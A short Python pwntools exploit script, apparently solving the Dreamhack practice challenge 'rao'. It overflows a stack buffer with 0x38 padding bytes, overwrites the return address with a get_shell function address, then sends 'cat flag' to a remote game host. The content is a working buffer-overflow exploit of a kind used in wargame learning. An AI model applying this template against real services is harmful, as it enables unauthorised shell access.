from pwn import *

url = "host3.dreamhack.games"
port = 숫자
#p = process("./rao")
r = remote(url, port)

get_shell = p64(0x4006aa)

payload = b'a' * 0x38 + get_shell
r.sendlineafter("Input", payload)

r.sendline("cat flag")
print("rao_flag val======")
print(r.recvline(timeout=2).decode())
r.close()
